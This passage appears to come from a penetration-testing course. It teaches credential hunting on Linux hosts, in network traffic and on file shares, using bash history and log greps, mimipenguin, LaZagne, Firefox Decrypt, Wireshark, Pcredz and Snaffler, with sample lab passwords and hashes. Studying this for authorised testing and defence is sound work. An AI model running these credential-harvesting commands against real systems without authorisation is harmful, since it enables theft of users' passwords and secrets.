/etc/cron.daily/:
total 68
drwxr-xr-x<span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 252 </span> 6. Jan 16:24 .
drwxr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 5728 </span> 1. Feb 00:06 ..
&lt;SNIP&gt;
</code></pre>
<p><strong>Enumerating history files</strong></p>
<p>All history files provide crucial information about the current and past/historical course of processes. We are interested in the files that store users&#39; command history and the logs that store information about system processes.</p>
<p>In the history of the commands entered on Linux distributions that use Bash as a standard shell, we find the associated files in <code>.bash_history</code>. Nevertheless, other files like <code>.bashrc</code> or <code>.bash_profile</code> can contain important information.</p>
<p>&#x20; Credential Hunting in Linux</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ tail -n5 /home/*/.bash*

=<span class="ruby">=&gt; /home/cry0l1t3/.bash_history &lt;==
</span>vim ~/testing.txt
vim ~/testing.txt
chmod 755 /tmp/api.py
su
<span class="hljs-comment">/tmp/api.py cry0l1t3 6mX4UP1eWH3HXK</span>

=<span class="ruby">=&gt; /home/cry0l1t3/.bashrc &lt;==
</span>    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
</code></pre>
<p><strong>Enumerating log files</strong></p>
<p>An essential concept of Linux systems is log files that are stored in text files. Many programs, especially all services and the system itself, write such files. In them, we find system errors, detect problems regarding services or follow what the system is doing in the background. The entirety of log files can be divided into four categories:</p>
<ul>
<li>Application logs</li>
<li>Event logs</li>
<li>Service logs</li>
<li>System logs</li>
</ul>
<p>Many different logs exist on the system. These can vary depending on the applications installed, but here are some of the most important ones:</p>
<table>
<thead>
<tr>
<th><strong>File</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>/var/log/messages</code></td>
<td>Generic system activity logs.</td>
</tr>
<tr>
<td><code>/var/log/syslog</code></td>
<td>Generic system activity logs.</td>
</tr>
<tr>
<td><code>/var/log/auth.log</code></td>
<td>(Debian) All authentication related logs.</td>
</tr>
<tr>
<td><code>/var/log/secure</code></td>
<td>(RedHat/CentOS) All authentication related logs.</td>
</tr>
<tr>
<td><code>/var/log/boot.log</code></td>
<td>Booting information.</td>
</tr>
<tr>
<td><code>/var/log/dmesg</code></td>
<td>Hardware and drivers related information and logs.</td>
</tr>
<tr>
<td><code>/var/log/kern.log</code></td>
<td>Kernel related warnings, errors and logs.</td>
</tr>
<tr>
<td><code>/var/log/faillog</code></td>
<td>Failed login attempts.</td>
</tr>
<tr>
<td><code>/var/log/cron</code></td>
<td>Information related to cron jobs.</td>
</tr>
<tr>
<td><code>/var/log/mail.log</code></td>
<td>All mail server related logs.</td>
</tr>
<tr>
<td><code>/var/log/httpd</code></td>
<td>All Apache related logs.</td>
</tr>
<tr>
<td><code>/var/log/mysqld.log</code></td>
<td>All MySQL server related logs.</td>
</tr>
</tbody>
</table>
<p>Covering the analysis of these log files in detail would be inefficient in this case. So at this point, we should familiarize ourselves with the individual logs, first examining them manually and understanding their formats. However, here are some strings we can use to find interesting content in the logs:</p>
<p>&#x20; Credential Hunting in Linux</p>
<pre><code class="lang-shell-session">root@htb[/htb]<span class="hljs-formula">$ for i in $</span>(ls /var/log/* 2&gt;/dev/null);do GREP=<span class="hljs-formula">$(grep "accepted<span class="hljs-tag">\<span class="hljs-name">|</span></span>session opened<span class="hljs-tag">\<span class="hljs-name">|</span></span>session closed<span class="hljs-tag">\<span class="hljs-name">|</span></span>failure<span class="hljs-tag">\<span class="hljs-name">|</span></span>failed<span class="hljs-tag">\<span class="hljs-name">|</span></span>ssh<span class="hljs-tag">\<span class="hljs-name">|</span></span>password changed<span class="hljs-tag">\<span class="hljs-name">|</span></span>new user<span class="hljs-tag">\<span class="hljs-name">|</span></span>delete user<span class="hljs-tag">\<span class="hljs-name">|</span></span>sudo<span class="hljs-tag">\<span class="hljs-name">|</span></span>COMMAND<span class="hljs-tag">\<span class="hljs-name">=</span></span><span class="hljs-tag">\<span class="hljs-name">|</span></span>logs" $</span>i 2&gt;/dev/null); if [[ <span class="hljs-formula">$GREP ]];then echo -e "<span class="hljs-tag">\<span class="hljs-name">n</span></span>#### Log file: " $</span>i; grep "accepted<span class="hljs-tag">\<span class="hljs-name">|</span></span>session opened<span class="hljs-tag">\<span class="hljs-name">|</span></span>session closed<span class="hljs-tag">\<span class="hljs-name">|</span></span>failure<span class="hljs-tag">\<span class="hljs-name">|</span></span>failed<span class="hljs-tag">\<span class="hljs-name">|</span></span>ssh<span class="hljs-tag">\<span class="hljs-name">|</span></span>password changed<span class="hljs-tag">\<span class="hljs-name">|</span></span>new user<span class="hljs-tag">\<span class="hljs-name">|</span></span>delete user<span class="hljs-tag">\<span class="hljs-name">|</span></span>sudo<span class="hljs-tag">\<span class="hljs-name">|</span></span>COMMAND<span class="hljs-tag">\<span class="hljs-name">=</span></span><span class="hljs-tag">\<span class="hljs-name">|</span></span>logs" <span class="hljs-formula">$i 2&gt;/dev/null;fi;done

#### Log file:  /var/log/dpkg.log.1
2022-01-10 17:57:41 install libssh-dev:amd64 &lt;none&gt; 0.9.5-1+deb11u1
2022-01-10 17:57:41 status half-installed libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
2022-01-10 17:57:41 configure libssh-dev:amd64 0.9.5-1+deb11u1 &lt;none&gt; 
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
2022-01-10 17:57:41 status half-configured libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status installed libssh-dev:amd64 0.9.5-1+deb11u1
&lt;SNIP&gt;</span>
</code></pre>
<h3 id="memory-and-cache">Memory and cache</h3>
<p><strong>Mimipenguin</strong></p>
<p>Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused. For example, it may be the system-required credentials for the logged-in users. Another example is the credentials stored in the browsers, which can also be read. In order to retrieve this type of information from Linux distributions, there is a tool called <a href="https://github.com/huntergregal/mimipenguin">mimipenguin</a> that makes the whole process easier. However, this tool requires administrator/root permissions.</p>
<p>&#x20; Credential Hunting in Linux</p>
<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ sudo python3 mimipenguin.py

<span class="hljs-string">[SYSTEM - GNOME]</span>    cry0l1t3:WLpAEXFa0SbqOHY
</code></pre>
<p><strong>LaZagne</strong></p>
<p>An even more powerful tool we can use that was mentioned earlier in the Credential Hunting in Windows section is <code>LaZagne</code>. This tool allows us to access far more resources and extract the credentials. The passwords and hashes we can obtain come from the following sources but are not limited to:</p>
<ul>
<li>Wifi</li>
<li>Wpa_supplicant</li>
<li>Libsecret</li>
<li>Kwallet</li>
<li>Chromium-based</li>
<li>CLI</li>
<li>Mozilla</li>
<li>Thunderbird</li>
<li>Git</li>
<li>ENV variables</li>
<li>Grub</li>
<li>Fstab</li>
<li>AWS</li>
<li>Filezilla</li>
<li>Gftp</li>
<li>SSH</li>
<li>Apache</li>
<li>Shadow</li>
<li>Docker</li>
<li>Keepass</li>
<li>Mimipy</li>
<li>Sessions</li>
<li>Keyrings</li>
</ul>
<p>For example, <code>Keyrings</code> are used for secure storage and management of passwords on Linux distributions. Passwords are stored encrypted and protected with a master password. It is an OS-based password manager, which we will discuss later in another section. This way, we do not need to remember every single password and can save repeated password entries.</p>
<p>&#x20; Credential Hunting in Linux</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb[/htb]$</span> sudo python2.7 laZagne.py all

|<span class="hljs-string">====================================================================</span>|
|<span class="hljs-string">                                                                    </span>|
|<span class="hljs-string">                        The LaZagne Project                         </span>|
|<span class="hljs-string">                                                                    </span>|
|<span class="hljs-string">                          ! BANG BANG !                             </span>|
|<span class="hljs-string">                                                                    </span>|
|<span class="hljs-string">====================================================================</span>|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: systemd-coredump
Hash: !!:18858::::::

[+] Hash found !!!
Login: sambauser
Hash: $6$wgK4tGq7Jepa.V0g$QkxvseL.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI.8negiUSPqaWyv7wC8uwsWPrx1:18862:0:99999:7:::

[+] Password found !!!
Login: cry0l1t3
Password: WLpAEXFa0SbqOHY


[+] 3 passwords have been found.
For more information launch it again with the -v option

elapsed time = 3.50091600418
</code></pre>
<p><strong>Browser credentials</strong></p>
<p>Browsers store the passwords saved by the user in an encrypted form locally on the system to be reused. For example, the <code>Mozilla Firefox</code> browser stores the credentials encrypted in a hidden folder for the respective user. These often include the associated field names, URLs, and other valuable information.</p>
<p>For example, when we store credentials for a web page in the Firefox browser, they are encrypted and stored in <code>logins.json</code> on the system. However, this does not mean that they are safe there. Many employees store such login data in their browser without suspecting that it can easily be decrypted and used against the company.</p>
<p>&#x20; Credential Hunting in Linux</p>
<pre><code class="lang-shell-session">[!bash]$ ls -l .mozilla/firefox/ | grep default 

drwx------<span class="hljs-number"> 11 </span>cry0l1t3 cry0l1t3<span class="hljs-number"> 4096 </span>Jan<span class="hljs-number"> 28 </span>16:02 1bplpd86.default-release
drwx------ <span class="hljs-number"> 2 </span>cry0l1t3 cry0l1t3<span class="hljs-number"> 4096 </span>Jan<span class="hljs-number"> 28 </span>13:30 lfx3lvhb.default
</code></pre>
<p>&#x20; Credential Hunting in Linux</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ cat .mozilla/</span>firefox<span class="hljs-regexp">/1bplpd86.default-release/</span>logins.json | jq .

{
  <span class="hljs-string">"nextId"</span>: <span class="hljs-number">2</span>,
  <span class="hljs-string">"logins"</span>: [
    {
      <span class="hljs-string">"id"</span>: <span class="hljs-number">1</span>,
      <span class="hljs-string">"hostname"</span>: <span class="hljs-string">"https://www.inlanefreight.com"</span>,
      <span class="hljs-string">"httpRealm"</span>: <span class="hljs-literal">null</span>,
      <span class="hljs-string">"formSubmitURL"</span>: <span class="hljs-string">"https://www.inlanefreight.com"</span>,
      <span class="hljs-string">"usernameField"</span>: <span class="hljs-string">"username"</span>,
      <span class="hljs-string">"passwordField"</span>: <span class="hljs-string">"password"</span>,
      <span class="hljs-string">"encryptedUsername"</span>: <span class="hljs-string">"MDoEEPgAAAA...SNIP...1liQiqBBAG/8/UpqwNlEPScm0uecyr"</span>,
      <span class="hljs-string">"encryptedPassword"</span>: <span class="hljs-string">"MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE="</span>,
      <span class="hljs-string">"guid"</span>: <span class="hljs-string">"{412629aa-4113-4ff9-befe-dd9b4ca388e2}"</span>,
      <span class="hljs-string">"encType"</span>: <span class="hljs-number">1</span>,
      <span class="hljs-string">"timeCreated"</span>: <span class="hljs-number">1643373110869</span>,
      <span class="hljs-string">"timeLastUsed"</span>: <span class="hljs-number">1643373110869</span>,
      <span class="hljs-string">"timePasswordChanged"</span>: <span class="hljs-number">1643373110869</span>,
      <span class="hljs-string">"timesUsed"</span>: <span class="hljs-number">1</span>
    }
  ],
  <span class="hljs-string">"potentiallyVulnerablePasswords"</span>: [],
  <span class="hljs-string">"dismissedBreachAlertsByLoginGUID"</span>: {},
  <span class="hljs-string">"version"</span>: <span class="hljs-number">3</span>
}
</code></pre>
<p>The tool <a href="https://github.com/unode/firefox_decrypt">Firefox Decrypt</a> is excellent for decrypting these credentials, and is updated regularly. It requires Python 3.9 to run the latest version. Otherwise, <code>Firefox Decrypt 0.7.0</code> with Python 2 must be used.</p>
<p>&#x20; Credential Hunting in Linux</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ python3<span class="hljs-number">.9</span> firefox_decrypt.py

Select the Mozilla profile you wish to decrypt
<span class="hljs-number">1</span> -&gt; lfx3lvhb.<span class="hljs-keyword">default</span>
<span class="hljs-number">2</span> -&gt; <span class="hljs-number">1</span>bplpd86.<span class="hljs-keyword">default</span>-release

<span class="hljs-number">2</span>
<span class="hljs-symbol">
Website:</span>   <span class="hljs-string">https:</span><span class="hljs-comment">//testing.dev.inlanefreight.com</span>
<span class="hljs-string">Username:</span> <span class="hljs-string">'test'</span>
<span class="hljs-string">Password:</span> <span class="hljs-string">'test'</span>
<span class="hljs-symbol">
Website:</span>   <span class="hljs-string">https:</span><span class="hljs-comment">//www.inlanefreight.com</span>
<span class="hljs-string">Username:</span> <span class="hljs-string">'cry0l1t3'</span>
<span class="hljs-string">Password:</span> <span class="hljs-string">'FzXUxJemKm6g2lGh'</span>
</code></pre>
<p>Alternatively, <code>LaZagne</code> can also return results if the user has used the supported browser.</p>
<p>&#x20; Credential Hunting in Linux</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb[/htb]$</span> python3 laZagne.py browsers

|<span class="hljs-string">====================================================================</span>|
|<span class="hljs-string">                                                                    </span>|
|<span class="hljs-string">                        The LaZagne Project                         </span>|
|<span class="hljs-string">                                                                    </span>|
|<span class="hljs-string">                          ! BANG BANG !                             </span>|
|<span class="hljs-string">                                                                    </span>|
|<span class="hljs-string">====================================================================</span>|

------------------- Firefox passwords -----------------

[+] Password found !!!
URL: https://testing.dev.inlanefreight.com
Login: test
Password: test

[+] Password found !!!
URL: https://www.inlanefreight.com
Login: cry0l1t3
Password: FzXUxJemKm6g2lGh


[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.2310788631439209
</code></pre>
<hr>
<h2 id="credential-hunting-in-network-traffic">Credential Hunting in Network Traffic</h2>
<p>In today&#39;s security-conscious world, most applications wisely use TLS to encrypt sensitive data in transit. However, not all environments are fully secured. Legacy systems, misconfigured services, or test applications launched without HTTPS can still result in the use of unencrypted protocols such as HTTP or SNMP. These gaps present a valuable opportunity for attackers: <code>the chance to hunt for credentials in cleartext network traffic</code>. In this section, we&#39;ll explore practical techniques for identifying exposed information, such as usernames and passwords within common plaintext protocols using Wireshark. We&#39;ll also take a brief look at <a href="https://github.com/lgandx/PCredz">Pcredz</a>, a tool that can quickly scan network traffic for such data.</p>
<p>The table below lists several common protocols alongside their encrypted counterparts. While it is now more common to encounter the secure versions, there was a time when plaintext protocols were widely used.</p>
<table>
<thead>
<tr>
<th>Unencrypted Protocol</th>
<th>Encrypted Counterpart</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>HTTP</code></td>
<td><code>HTTPS</code></td>
<td>Used for transferring web pages and resources over the internet.</td>
</tr>
<tr>
<td><code>FTP</code></td>
<td><code>FTPS/SFTP</code></td>
<td>Used for transferring files between a client and a server.</td>
</tr>
<tr>
<td><code>SNMP</code></td>
<td><code>SNMPv3 (with encryption)</code></td>
<td>Used for monitoring and managing network devices like routers and switches.</td>
</tr>
<tr>
<td><code>POP3</code></td>
<td><code>POP3S</code></td>
<td>Retrieves emails from a mail server to a local client.</td>
</tr>
<tr>
<td><code>IMAP</code></td>
<td><code>IMAPS</code></td>
<td>Accesses and manages email messages directly on the mail server.</td>
</tr>
<tr>
<td><code>SMTP</code></td>
<td><code>SMTPS</code></td>
<td>Sends email messages from client to server or between mail servers.</td>
</tr>
<tr>
<td><code>LDAP</code></td>
<td><code>LDAPS</code></td>
<td>Queries and modifies directory services like user credentials and roles.</td>
</tr>
<tr>
<td><code>RDP</code></td>
<td><code>RDP (with TLS)</code></td>
<td>Provides remote desktop access to Windows systems.</td>
</tr>
<tr>
<td><code>DNS (Traditional)</code></td>
<td><code>DNS over HTTPS (DoH)</code></td>
<td>Resolves domain names into IP addresses.</td>
</tr>
<tr>
<td><code>SMB</code></td>
<td><code>SMB over TLS (SMB 3.0)</code></td>
<td>Shares files, printers, and other resources over a network.</td>
</tr>
<tr>
<td><code>VNC</code></td>
<td><code>VNC with TLS/SSL</code></td>
<td>Allows graphical remote control of another computer.</td>
</tr>
</tbody>
</table>
<h3 id="wireshark">Wireshark</h3>
<p><a href="https://www.wireshark.org/">Wireshark</a> is well known packet analyzer that comes pre-installed nearly all penetration testing Linux distributions. It features a powerful <a href="https://www.wireshark.org/docs/man-pages/wireshark-filter.html">filter engine</a> that allows for efficient searching through both live and captured network traffic. Some basic but useful filters include:</p>
<table>
<thead>
<tr>
<th>Wireshark filter</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>ip.addr == 56.48.210.13</code></td>
<td>Filters packets with a specific IP address</td>
</tr>
<tr>
<td><code>tcp.port == 80</code></td>
<td>Filters packets by port (HTTP in this case).</td>
</tr>
<tr>
<td><code>http</code></td>
<td>Filters for HTTP traffic.</td>
</tr>
<tr>
<td><code>dns</code></td>
<td>Filters DNS traffic, which is useful to monitor domain name resolution.</td>
</tr>
<tr>
<td><code>tcp.flags.syn == 1 &amp;&amp; tcp.flags.ack == 0</code></td>
<td>Filters SYN packets (used in TCP handshakes), useful for detecting scanning or connection attempts.</td>
</tr>
<tr>
<td><code>icmp</code></td>
<td>Filters ICMP packets (used for Ping), which can be useful for reconnaissance or network issues.</td>
</tr>
<tr>
<td><code>http.request.method == &quot;POST&quot;</code></td>
<td>Filters for HTTP POST requests. In the case that POST requests are sent over unencrypted HTTP, it may be the case that passwords or other sensitive information is contained within.</td>
</tr>
<tr>
<td><code>tcp.stream eq 53</code></td>
<td>Filters for a specific TCP stream. Helps track a conversation between two hosts.</td>
</tr>
<tr>
<td><code>eth.addr == 00:11:22:33:44:55</code></td>
<td>Filters packets from/to a specific MAC address.</td>
</tr>
<tr>
<td><code>ip.src == 192.168.24.3 &amp;&amp; ip.dst == 56.48.210.3</code></td>
<td>Filters traffic between two specific IP addresses. Helps track communication between specific hosts.</td>
</tr>
</tbody>
</table>
<p>For example, in the image below we are filtering for unencrypted <code>HTTP</code> traffic.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/308/img/Net_2.png" alt="Network packet capture showing HTTP requests with source, destination, protocol, length, and info details."></p>
<p>In Wireshark, it&#39;s possible to locate packets that contain specific bytes or strings. One way to do this is by using a display filter such as <code>http contains &quot;passw&quot;</code>. Alternatively, you can navigate to <code>Edit &gt; Find Packet</code> and enter the desired search query manually. For example, you might search for packets containing the string <code>&quot;passw&quot;</code>:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/308/img/Net_3.png" alt="Network packet capture showing HTTP requests with details. Highlighted POST request includes HTML form data with username and password fields."></p>
<p>It&#39;s worth familiarizing yourself with the syntax of Wireshark&#39;s filtering engine, especially if you ever need to perform network traffic analysis.</p>
<h3 id="pcredz">Pcredz</h3>
<p><a href="https://github.com/lgandx/PCredz">Pcredz</a> is a tool that can be used to extract credentials from live traffic or network packet captures. Specifically, it supports extracting the following information:</p>
<ul>
<li>Credit card numbers</li>
<li>POP credentials</li>
<li>SMTP credentials</li>
<li>IMAP credentials</li>
<li>SNMP community strings</li>
<li>FTP credentials</li>
<li>Credentials from HTTP NTLM/Basic headers, as well as HTTP Forms</li>
<li>NTLMv1/v2 hashes from various traffic including DCE-RPC, SMBv1/2, LDAP, MSSQL, and HTTP</li>
<li>Kerberos (AS-REQ Pre-Auth etype 23) hashes</li>
</ul>
<p>In order to run <code>Pcredz</code>, one may either clone the repository and install all dependencies, or use the provided Docker container detailed in the <a href="https://github.com/lgandx/PCredz?tab=readme-ov-file#install">Install</a> portion of the README file.</p>
<p>The following command can be used to run <code>Pcredz</code> against a packet capture file:</p>
<p>&#x20; Credential Hunting in Network Traffic</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ./Pcredz -f demo<span class="hljs-selector-class">.pcapng</span> -t -v

Pcredz <span class="hljs-number">2.0</span>.<span class="hljs-number">2</span>
Author: Laurent Gaffie
Please send bugs/comments/pcaps to: laurent.gaffie@gmail<span class="hljs-selector-class">.com</span>
This script will extract NTLM (HTTP,LDAP,SMB,MSSQL,RPC, etc), Kerberos,
FTP, HTTP Basic and credit card data from <span class="hljs-selector-tag">a</span> given pcap file or from <span class="hljs-selector-tag">a</span> live interface.

CC number scanning activated

Unknown format, trying TCPDump format

[<span class="hljs-number">1746131482.601354</span>] protocol: udp <span class="hljs-number">192.168</span>.<span class="hljs-number">31.211</span>:<span class="hljs-number">59022</span> &gt; <span class="hljs-number">192.168</span>.<span class="hljs-number">31.238</span>:<span class="hljs-number">161</span>
Found SNMPv2 Community string: s3cr..<span class="hljs-selector-class">.SNIP</span>...

[<span class="hljs-number">1746131482.601640</span>] protocol: udp <span class="hljs-number">192.168</span>.<span class="hljs-number">31.211</span>:<span class="hljs-number">59022</span> &gt; <span class="hljs-number">192.168</span>.<span class="hljs-number">31.238</span>:<span class="hljs-number">161</span>
Found SNMPv2 Community string: s3cr..<span class="hljs-selector-class">.SNIP</span>...

&lt;SNIP&gt;

[<span class="hljs-number">1746131482.658938</span>] protocol: tcp <span class="hljs-number">192.168</span>.<span class="hljs-number">31.243</span>:<span class="hljs-number">55707</span> &gt; <span class="hljs-number">192.168</span>.<span class="hljs-number">31.211</span>:<span class="hljs-number">21</span>
FTP User: le..<span class="hljs-selector-class">.SNIP</span>...
FTP Pass: qw..<span class="hljs-selector-class">.SNIP</span>...

demo<span class="hljs-selector-class">.pcapng</span> parsed <span class="hljs-keyword">in</span>: <span class="hljs-number">1.82</span> seconds (File size <span class="hljs-number">15.5</span> Mo).
</code></pre>
<hr>
<h2 id="credential-hunting-in-network-shares">Credential Hunting in Network Shares</h2>
<p>Nearly all corporate environments include network shares used by employees to store and share files across teams. While these shared folders are essential, they can unintentionally become a goldmine for attackers, especially when sensitive data like plaintext credentials or configuration files are left behind. In this section, we&#39;ll explore how to hunt for credentials across network shares from both Windows and Linux systems using common tools, along with general techniques attackers use to uncover hidden secrets.</p>
<p><strong>Common credential patterns</strong></p>
<p>Before diving into specialized tools, it&#39;s important to understand the types of patterns and file formats that often reveal sensitive information. This was covered in earlier sections, so we won&#39;t repeat it in detail here. But as a quick reminder, here are some general tips:</p>
<ul>
<li>Look for keywords within files such as <code>passw</code>, <code>user</code>, <code>token</code>, <code>key</code>, and <code>secret</code>.</li>
<li>Search for files with extensions commonly associated with stored credentials, such as <code>.ini</code>, <code>.cfg</code>, <code>.env</code>, <code>.xlsx</code>, <code>.ps1</code>, and <code>.bat</code>.</li>
<li>Watch for files with &quot;interesting&quot; names that include terms like <code>config</code>, <code>user</code>, <code>passw</code>, <code>cred</code>, or <code>initial</code>.</li>
<li>If you&#39;re trying to locate credentials within the <code>INLANEFREIGHT.LOCAL</code> domain, it may be helpful to search for files containing the string <code>INLANEFREIGHT\</code>.</li>
<li>Keywords should be localized based on the target; if you are attacking a German company, it&#39;s more likely they will reference a <code>&quot;Benutzer&quot;</code> than a <code>&quot;User&quot;</code>.</li>
<li>Pay attention to the shares you are looking at, and be strategic. If you scan ten shares with thousands of files each, it&#39;s going to take a signifcant amount of time. Shares used by <code>IT employees</code> might be a more valuable target than those used for company photos.</li>
</ul>
<p>With all of this in mind, you may want to begin with basic command-line searches (e.g., <code>Get-ChildItem -Recurse -Include *.ext \\Server\Share | Select-String -Pattern ...</code>) before scaling up to more advanced tools. Let&#39;s take a look at how we can use <code>MANSPIDER</code>, <code>Snaffler</code>, <code>SnafflePy</code>, and <code>NetExec</code> to automate and enhance this credential hunting process.</p>
<h3 id="hunting-from-windows">Hunting from Windows</h3>
<p><strong>Snaffler</strong></p>
<p>The first tool we will cover is <a href="https://github.com/SnaffCon/Snaffler">Snaffler</a>. This is a C# program that, when run on a <code>domain-joined</code> machine, automatically identifies accessible network shares and searches for interesting files. The <code>README</code> file in the Github repository describes the numerous configuration options in great detail, however a basic search can be carried out like so:</p>
<p>&#x20; Credential Hunting in Network Shares</p>
<pre><code class="lang-cmd-session">c:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">Public</span></span>&gt;Snaffler.exe -s

 .::::::.:::.    :::.  :::.    .-:::::'.-:::::':::    .,:::::: :::::::..
;;;`    ``;;;;,  `;;;  ;;`;;   ;;;'''' ;;;'''' ;;;    ;;;;'''' ;;;;``;;;;
'[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['
  '''    <span class="hljs-formula">$ $</span><span class="hljs-formula">$$ 'Y$c$$</span>c<span class="hljs-formula">$$$cc$$</span><span class="hljs-formula">$c`$</span><span class="hljs-formula">$$'`` `$$</span><span class="hljs-formula">$'`` $</span><span class="hljs-formula">$'     $</span><span class="hljs-formula">$""   $</span><span class="hljs-formula">$$$$</span><span class="hljs-formula">$c
 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '88bo,
  'YMmMY'  MMM     YM YMM   ''` 'MM,    'MM,  ''''YUMMM''''YUMMMMMMM   'W'
                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler


[INLANEFREIGHT<span class="hljs-tag">\<span class="hljs-name">jbader</span></span>@DC01] 2025-05-01 17:41:42Z [Info] Parsing args...
[INLANEFREIGHT<span class="hljs-tag">\<span class="hljs-name">jbader</span></span>@DC01] 2025-05-01 17:41:43Z [Info] Parsed args successfully.
[INLANEFREIGHT<span class="hljs-tag">\<span class="hljs-name">jbader</span></span>@DC01] 2025-05-01 17:41:43Z [Info] Invoking DFS Discovery because no ComputerTargets or PathTargets were specified
[INLANEFREIGHT<span class="hljs-tag">\<span class="hljs-name">jbader</span></span>@DC01] 2025-05-01 17:41:43Z [Info] Getting DFS paths from AD.
[INLANEFREIGHT<span class="hljs-tag">\<span class="hljs-name">jbader</span></span>@DC01] 2025-05-01 17:41:43Z [Info] Found 0 DFS Shares in 0 namespaces.
[INLANEFREIGHT<span class="hljs-tag">\<span class="hljs-name">jbader</span></span>@DC01] 2025-05-01 17:41:43Z [Info] Invoking full domain computer discovery.
[INLANEFREIGHT<span class="hljs-tag">\<span class="hljs-name">jbader</span></span>@DC01] 2025-05-01 17:41:43Z [Info] Getting computers from AD.
[INLANEFREIGHT<span class="hljs-tag">\<span class="hljs-name">jbader</span></span>@DC01] 2025-05-01 17:41:43Z [Info] Got 1 computers from AD.
[INLANEFREIGHT<span class="hljs-tag">\<span class="hljs-name">jbader</span></span>@DC01] 2025-05-01 17:41:43Z [Info] Starting to look for readable shares...
[INLANEFREIGHT<span class="hljs-tag">\<span class="hljs-name">jbader</span></span>@DC01] 2025-05-01 17:41:43Z [Info] Created all sharefinder tasks.
[INLANEFREIGHT<span class="hljs-tag">\<span class="hljs-name">jbader</span></span>@DC01] 2025-05-01 17:41:43Z [Share] {Black}&lt;<span class="hljs-tag">\<span class="hljs-name">\</span></span>DC01.inlanefreight.local<span class="hljs-tag">\<span class="hljs-name">ADMIN</span></span>$</span>&gt;()
[INLANEFREIGHT<span class="hljs-tag">\<span class="hljs-name">jbader</span></span>@DC01] 2025-05-01 17:41:43Z [Share] {Green}&lt;<span class="hljs-tag">\<span class="hljs-name">\</span></span>DC01.inlanefreight.local<span class="hljs-tag">\<span class="hljs-name">ADMIN</span></span><span class="hljs-formula">$&gt;(R) Remote Admin
[INLANEFREIGHT<span class="hljs-tag">\<span class="hljs-name">jbader</span></span>@DC01] 2025-05-01 17:41:43Z [Share] {Black}&lt;<span class="hljs-tag">\<span class="hljs-name">\</span></span>DC01.inlanefreight.local<span class="hljs-tag">\<span class="hljs-name">C</span></span>$</span>&gt;()
[INLANEFREIGHT<span class="hljs-tag">\<span class="hljs-name">jbader</span></span>@DC01] 2025-05-01 17:41:43Z [Share] {Green}&lt;<span class="hljs-tag">\<span class="hljs-name">\</span></span>DC01.inlanefreight.local<span class="hljs-tag">\<span class="hljs-name">C</span></span><span class="hljs-formula">$&gt;(R) Default share
[INLANEFREIGHT<span class="hljs-tag">\<span class="hljs-name">jbader</span></span>@DC01] 2025-05-01 17:41:43Z [Share] {Green}&lt;<span class="hljs-tag">\<span class="hljs-name">\</span></span>DC01.inlanefreight.local<span class="hljs-tag">\<span class="hljs-name">Company</span></span>&gt;(R)
[INLANEFREIGHT<span class="hljs-tag">\<span class="hljs-name">jbader</span></span>@DC01] 2025-05-01 17:41:43Z [Share] {Green}&lt;<span class="hljs-tag">\<span class="hljs-name">\</span></span>DC01.inlanefreight.local<span class="hljs-tag">\<span class="hljs-name">Finance</span></span>&gt;(R)
[INLANEFREIGHT<span class="hljs-tag">\<span class="hljs-name">jbader</span></span>@DC01] 2025-05-01 17:41:43Z [Share] {Green}&lt;<span class="hljs-tag">\<span class="hljs-name">\</span></span>DC01.inlanefreight.local<span class="hljs-tag">\<span class="hljs-name">HR</span></span>&gt;(R)
[INLANEFREIGHT<span class="hljs-tag">\<span class="hljs-name">jbader</span></span>@DC01] 2025-05-01 17:41:43Z [Share] {Green}&lt;<span class="hljs-tag">\<span class="hljs-name">\</span></span>DC01.inlanefreight.local<span class="hljs-tag">\<span class="hljs-name">IT</span></span>&gt;(R)
[INLANEFREIGHT<span class="hljs-tag">\<span class="hljs-name">jbader</span></span>@DC01] 2025-05-01 17:41:43Z [Share] {Green}&lt;<span class="hljs-tag">\<span class="hljs-name">\</span></span>DC01.inlanefreight.local<span class="hljs-tag">\<span class="hljs-name">Marketing</span></span>&gt;(R)
[INLANEFREIGHT<span class="hljs-tag">\<span class="hljs-name">jbader</span></span>@DC01] 2025-05-01 17:41:43Z [Share] {Green}&lt;<span class="hljs-tag">\<span class="hljs-name">\</span></span>DC01.inlanefreight.local<span class="hljs-tag">\<span class="hljs-name">NETLOGON</span></span>&gt;(R) Logon server share
[INLANEFREIGHT<span class="hljs-tag">\<span class="hljs-name">jbader</span></span>@DC01] 2025-05-01 17:41:43Z [Share] {Green}&lt;<span class="hljs-tag">\<span class="hljs-name">\</span></span>DC01.inlanefreight.local<span class="hljs-tag">\<span class="hljs-name">Sales</span></span>&gt;(R)
